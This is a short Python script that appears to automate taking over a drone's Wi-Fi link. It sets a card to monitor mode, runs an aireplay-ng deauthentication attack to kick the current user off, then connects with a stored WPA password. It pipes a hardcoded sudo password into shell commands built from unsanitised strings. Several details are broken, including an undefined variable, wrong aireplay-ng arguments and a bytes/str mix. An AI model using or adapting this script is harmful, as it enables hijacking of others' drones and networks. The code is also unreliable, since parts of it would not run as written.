import subprocess
import json
import argparse

flag = 1

while(flag == 1):

    drone = json.loads(wpaInfo) # load in wpa info from csv2json

    myPass = 'kali' #password used to execute sudo command

    subprocess.call(["nmcli", "radio", "wifi", "on"])

#setting wifi into monitor mode
    cmd = "ip link set wlan0 down" 

    linkDown = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

    cmd = "iw dev set type monitor"

    setMon = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

    cmd = "ip link set wlan0 up"

# Executing deauth of external user
    linkUp = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

# Deauth User
    cmd = "aireplay-ng -0 10 -a " + drone["Bssid"] + " -c " + drone["Essid"] + " wlan1"

    deAuth = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

# Connect to wifi while external user is deauthorized
    cmd = "sudo nmcli dev wifi connect " + drone["Essid"] + " password " + drone["password"]

    # cmd = "sudo nmcli dev wifi connect TELLO-EE7A20" # Hardcoded test value

    connect = subprocess.Popen('echo {} | sudo -S {}'.format(myPass, cmd), shell = True, stderr=subprocess.PIPE)

    output, err = connect.communicate("input data that is passed to subprocess' stderr")

    # print("Signal of drone named "+drone["ssid"]+" not found")

    error = b"Error: No network with SSID" + drone["Essid"] + "found.\n"
    if(err != error):

        flag = 0